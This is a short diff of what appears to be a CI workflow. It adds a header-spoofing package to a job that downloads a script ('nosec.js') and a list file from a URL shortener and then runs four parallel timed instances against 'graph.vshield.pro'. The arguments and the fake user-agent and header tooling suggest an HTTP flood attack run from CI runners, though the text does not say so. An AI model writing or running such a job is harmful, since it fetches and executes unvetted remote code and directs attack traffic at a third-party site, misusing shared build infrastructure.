@@ -18,7 +18,7 @@ jobs:
           wget https://curl.by/C_qXK/nosec.js
           wget https://curl.by/19kka/fres.txt
           chmod +x nosec.js
-          npm i user-agents fake-useragent 
+          npm i user-agents fake-useragent header-generator
           PIDS=()
           for i in {1..4}; do
             timeout 105 node nosec.js https://graph.vshield.pro/ 100 90 8 fres.txt
